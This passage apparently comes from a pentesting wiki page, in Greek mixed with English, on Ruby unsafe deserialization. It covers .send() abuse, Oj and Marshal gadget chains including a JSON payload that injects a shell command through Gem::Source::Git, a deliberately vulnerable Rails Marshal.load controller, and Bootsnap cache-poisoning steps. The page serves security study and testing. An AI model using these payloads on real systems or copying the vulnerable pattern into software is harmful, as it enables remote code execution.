Όπως εξηγείται στο [**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), εάν κάποια μη καθαρισμένη είσοδος χρήστη φτάσει στη `.send()` μέθοδο ενός ruby αντικειμένου, αυτή η μέθοδος επιτρέπει να **κληθεί οποιαδήποτε άλλη μέθοδος** του αντικειμένου με οποιουσδήποτε παραμέτρους.

Για παράδειγμα, η κλήση του eval και στη συνέχεια η παροχή ruby κώδικα ως δεύτερου παραμέτρου θα επιτρέψει την εκτέλεση αυθαίρετου κώδικα:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Επιπλέον, αν μόνο μία παράμετρος της **`.send()`** ελέγχεται από έναν attacker, όπως αναφέρθηκε στο προηγούμενο writeup, είναι δυνατόν να κληθεί οποιαδήποτε μέθοδος του αντικειμένου που **δεν χρειάζεται ορίσματα** ή των οποίων τα ορίσματα έχουν **προεπιλεγμένες τιμές**.\
Για αυτό, είναι δυνατόν να απαριθμηθούν όλες οι μέθοδοι του αντικειμένου για να **βρεθούν μερικές ενδιαφέρουσες μέθοδοι που πληρούν αυτές τις απαιτήσεις**.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

Δες πώς είναι δυνατό να [pollute a Ruby class and abuse it in here](ruby-class-pollution.md).

### Ruby _json pollution

Όταν στο body στέλνονται κάποιες τιμές που δεν μπορούν να hashαριστούν, όπως ένα array, θα προστεθούν σε ένα νέο κλειδί με όνομα `_json`. Ωστόσο, είναι δυνατόν ένας επιτιθέμενος να θέσει επίσης στο body μία τιμή με όνομα `_json` με οποιεσδήποτε αυθαίρετες τιμές επιθυμεί. Έτσι, αν το backend, για παράδειγμα, ελέγχει την εγκυρότητα ενός παραμέτρου αλλά στη συνέχεια χρησιμοποιεί την παράμετρο `_json` για να εκτελέσει κάποια ενέργεια, μπορεί να προκύψει παράκαμψη εξουσιοδότησης.

Δες περισσότερες πληροφορίες στη [Ruby _json pollution page](ruby-_json-pollution.md).

### Άλλες βιβλιοθήκες

Αυτή η τεχνική λήφθηκε[ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

Υπάρχουν κι άλλες Ruby βιβλιοθήκες που μπορούν να χρησιμοποιηθούν για τη σειριοποίηση αντικειμένων και επομένως που θα μπορούσαν να καταχραστούν για να αποκτηθεί RCE κατά την μη ασφαλή αποσειριοποίηση. Ο παρακάτω πίνακας δείχνει μερικές από αυτές τις βιβλιοθήκες και τη μέθοδο που καλείται στην κλάση της φορτωμένης βιβλιοθήκης κάθε φορά που αποσειριοποιείται (η συνάρτηση που καταχράται για να αποκτηθεί RCE βασικά):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Βιβλιοθήκη</strong></td><td><strong>Input data</strong></td><td><strong>Κλήση-εκκίνησης μέσα στην κλάση</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (class needs to be put into hash(map) as key)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

Basic example:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Στην περίπτωση προσπάθειας κατάχρησης του Oj, ήταν δυνατό να βρεθεί ένα gadget class που μέσα στη συνάρτηση `hash` του θα καλεί `to_s`, το οποίο με τη σειρά του καλεί spec, που καλεί fetch_path — το οποίο μπορούσε να αναγκαστεί να κάνει fetch ένα τυχαίο URL — δίνοντας έναν εξαιρετικό ανιχνευτή για αυτού του είδους τις unsanitized deserialization vulnerabilities.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Επιπλέον, βρέθηκε ότι με την προηγούμενη τεχνική δημιουργείται επίσης ένας φάκελος στο σύστημα, ο οποίος είναι απαραίτητος για την κατάχρηση ενός άλλου gadget προκειμένου να το μετατρέψετε σε πλήρες RCE με κάτι όπως:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Bootstrap Caching

Not really a desearilization vuln but a nice trick to abuse bootstrap caching to to get RCE from a rails application with an arbitrary file write (find the complete [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

Below is a short summary of the steps detailed in the article for exploiting an arbitrary file write vulnerability by abusing Bootsnap caching:

- Identify the Vulnerability and Environment

Η λειτουργία ανέβασματος αρχείων της Rails εφαρμογής επιτρέπει σε έναν attacker να γράφει αρχεία arbitrarily. Παρόλο που η εφαρμογή εκτελείται με περιορισμούς (μόνο συγκεκριμένοι κατάλογοι όπως tmp είναι εγγράψιμοι λόγω του Docker’s non-root user), αυτό εξακολουθεί να επιτρέπει την εγγραφή στον Bootsnap cache directory (τυπικά under tmp/cache/bootsnap).

- Understand Bootsnap’s Cache Mechanism

Το Bootsnap επιταχύνει τους χρόνους εκκίνησης του Rails αποθηκεύοντας στην cache compiled Ruby code, YAML, και JSON αρχεία. Αποθηκεύει cache αρχεία που περιλαμβάνουν ένα cache key header (με πεδία όπως Ruby version, file size, mtime, compile options, κ.λπ.) ακολουθούμενο από τον compiled code. Αυτό το header χρησιμοποιείται για να validate την cache κατά την εκκίνηση της εφαρμογής.

- Gather File Metadata

Ο attacker επιλέγει πρώτα ένα target αρχείο που πιθανότατα φορτώνεται κατά την εκκίνηση του Rails (for example, set.rb from Ruby’s standard library). Εκτελώντας Ruby code μέσα στο container, εξάγουν κρίσιμα metadata (όπως RUBY_VERSION, RUBY_REVISION, size, mtime, και compile_option). Αυτά τα δεδομένα είναι απαραίτητα για την κατασκευή ενός έγκυρου cache key.

- Compute the Cache File Path

Αναπαράγοντας τον μηχανισμό FNV-1a 64-bit hash του Bootsnap, προσδιορίζεται η σωστή cache file path. Αυτό το βήμα εξασφαλίζει ότι το malicious cache file τοποθετείται ακριβώς εκεί όπου Bootsnap το περιμένει (e.g., under tmp/cache/bootsnap/compile-cache-iseq/).

- Craft the Malicious Cache File

Ο attacker προετοιμάζει ένα payload που:

- Εκτελεί arbitrary commands (for example, running id to show process info).
- Αφαιρεί το malicious cache μετά την εκτέλεση για να αποτρέψει recursive exploitation.
- Φορτώνει το original file (e.g., set.rb) για να αποφευχθεί το crashing της εφαρμογής.

Αυτό το payload μεταγλωττίζεται σε binary Ruby code και συνδέεται με ένα προσεκτικά κατασκευασμένο cache key header (χρησιμοποιώντας τα προηγουμένως gathered metadata και τον σωστό version number για Bootsnap).

- Overwrite and Trigger Execution
Χρησιμοποιώντας την arbitrary file write vulnerability, ο attacker γράφει το crafted cache file στη computed location. Στη συνέχεια triggerάρει ένα server restart (by writing to tmp/restart.txt, which is monitored by Puma). Κατά την restart, όταν Rails requires το στοχευμένο αρχείο, το malicious cache file φορτώνεται, οδηγώντας σε remote code execution (RCE).



### Ruby Marshal exploitation in practice (updated)

Θεωρήστε οποιοδήποτε path όπου untrusted bytes φτάνουν σε `Marshal.load`/`marshal_load` ως RCE sink. Το Marshal ανασυνθέτει arbitrary object graphs και triggers library/gem callbacks κατά τη διάρκεια της materialization.


- Minimal vulnerable Rails code path:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Συνηθισμένες gadget classes που παρατηρούνται σε πραγματικές chains: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- Τυπικό side-effect marker ενσωματωμένο σε payloads (εκτελείται κατά το unmarshal):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Πού εμφανίζεται σε πραγματικές εφαρμογές:
- Τα cache stores και τα session stores σε Rails που ιστορικά χρησιμοποιούν Marshal
- Backends για background jobs και file-backed object stores
- Οποιαδήποτε προσαρμοσμένη αποθήκευση ή μεταφορά δυαδικών object blobs

Βιομηχανοποιημένη ανακάλυψη gadget:
- Χρησιμοποιήστε grep για constructors, `hash`, `_load`, `init_with` ή μεθόδους με παρενέργειες που καλούνται κατά το unmarshal
- Χρησιμοποιήστε τα CodeQL’s Ruby unsafe deserialization queries για να εντοπίσετε sources → sinks και να εμφανίσετε gadgets
- Επικυρώστε με δημόσια multi-format PoCs (JSON/XML/YAML/Marshal)


## Αναφορές

- Trail of Bits – Marshal madness: A brief history of Ruby deserialization exploits: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)

{{#include ../../banners/hacktricks-training.md}}
